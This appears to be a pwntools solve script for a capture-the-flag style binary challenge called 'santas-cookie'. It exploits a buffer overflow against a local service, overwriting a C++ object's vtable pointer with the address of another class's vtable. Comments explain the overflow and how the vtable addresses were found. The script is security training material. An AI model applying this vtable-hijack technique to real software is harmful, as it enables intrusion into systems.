#!/usr/bin/env python3

import pwn
import socket
import threading

# docker compose -f debug.yml up
# python3 ./solve.py
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/santas-cookie')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

pwn.context.arch = 'amd64'

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")

port = 1024
conn = pwn.remote('127.0.0.1', port)

# wait for user input (in this time, connect gdb)
pwn.pause()

# the cookiejar is a struct of char and cookie
# we can overrride the first 8 byte of cookie because there is an buffer overflow
# this is the vtable of Cookie, replace to pointer to vtable of specialsantacookie

# get vtable via: 
"""
0000000000000000       O *UND*	0000000000000000              vtable for __cxxabiv1::__class_type_info@CXXABI_1.3
0000000000403da0  w    O .data.rel.ro	0000000000000018              vtable for SantaSpecialCookie
0000000000000000       O *UND*	0000000000000000              vtable for __cxxabiv1::__si_class_type_info@CXXABI_1.3
0000000000403db8  w    O .data.rel.ro	0000000000000018              vtable for Cookie
"""
vtable_special = 0x0000000000403da0
vtable_cookie  = 0x0000000000403db8
conn.sendlineafter(b'Cookie decoration > ', b'A'*64 + pwn.p64(vtable_special+16))

conn.interactive()
